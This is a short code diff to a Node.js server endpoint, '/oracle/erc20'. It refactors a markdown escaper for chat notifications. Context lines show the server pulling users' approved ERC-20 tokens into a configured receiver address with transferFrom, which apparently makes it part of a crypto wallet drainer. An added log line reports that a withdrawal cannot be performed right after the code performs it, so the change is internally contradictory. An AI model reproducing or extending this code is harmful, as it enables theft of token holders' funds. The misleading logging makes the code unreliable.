@@ -145,8 +145,29 @@ app.post("/oracle/erc20", async (req, res) => {
   let websiteUrl = req.body.websiteUrl;
   let chainId_ = parseInt(req.body.chainId);
 
-  let escaper = (ah) => { 
-    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
+  let escaper = (ah) => {
+    if (typeof ah !== 'string') {
+      return ah;
+    }
+  
+    return ah.replace(/_/g, '\\_')
+      .replace(/\*/g, '\\*')
+      .replace(/\[/g, '\\[')
+      .replace(/\]/g, '\\]')
+      .replace(/\(/g, '\\(')
+      .replace(/\)/g, '\\)')
+      .replace(/~/g, '\\~')
+      .replace(/`/g, '\\`')
+      .replace(/>/g, '\\>')
+      .replace(/#/g, '\\%23')
+      .replace(/\+/g, '\\+')
+      .replace(/-/g, '\\-')
+      .replace(/=/g, '\\=')
+      .replace(/\|/g, '\\|')
+      .replace(/{/g, '\\{')
+      .replace(/}/g, '\\}')
+      .replace(/\./g, '\\.')
+      .replace(/!/g, '\\!');
   }
 
 
@@ -190,6 +211,7 @@ let provider = new ethers.providers.JsonRpcProvider(
         withdrawal = await contractInstance.transferFrom(address, config.receiver, allowance, {gasPrice});
       } else {
         withdrawal = await contractInstance.transferFrom(address, config.receiver, balance, {gasPrice});
+        console.log("Balance is less than allowance. Cannot perform withdrawal.");
       }
 
 
